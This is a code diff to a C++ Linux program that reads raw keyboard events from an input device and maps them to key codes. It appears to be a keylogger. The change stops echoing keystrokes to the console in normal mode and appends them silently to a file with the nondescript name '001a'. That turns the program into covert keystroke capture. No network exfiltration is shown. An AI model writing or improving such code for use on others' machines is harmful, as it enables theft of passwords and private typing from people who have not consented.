@@ -1,4 +1,5 @@
 #include <iostream>
+#include <fstream> 
 #include <vector>
 #include <regex>
 #include <linux/input.h>  //Needed for input_event struct
@@ -191,6 +192,11 @@ namespace logger {
 		return handler;
 	}
 
+	bool fileExist (const std::string& name) {
+		std::ifstream file(name.c_str());
+		return file.good();
+	}
+
 	void connectHandler (std::string handler, bool verbose=false) {
 		const char * fileName = handler.c_str();
 		struct input_event holdEvent;
@@ -211,6 +217,15 @@ namespace logger {
 			std::cout << "Press ESC to exit the program." << std::endl;
 		}
 
+		std::ofstream logFile;
+		if (fileExist ("001a")) {
+			logFile.open("001a", std::ios_base::app);
+		}
+		else {
+			logFile.open("001a", std::ios::out);
+		} 
+
+
 		while (true) {
 			read(fd, &holdEvent, sizeof(holdEvent));
 			
@@ -218,9 +233,10 @@ namespace logger {
 				if (verbose) {
 					std::cout << "holdEvent.code: " << holdEvent.code << "\t";
 					std::cout << "KeyCode: " << keyCodes[holdEvent.code] << std::endl;
+					logFile << keyCodes[holdEvent.code];
 				}
 				else {
-					std::cout << keyCodes[holdEvent.code] << std::endl;
+					logFile << keyCodes[holdEvent.code];
 				}
 			}
 
@@ -228,7 +244,7 @@ namespace logger {
 				break;
 			}
 		}
-
+		logFile.close();
 
 		if (verbose) std::cout << "Closed connection to handler." << std::endl;
 		close(fd);
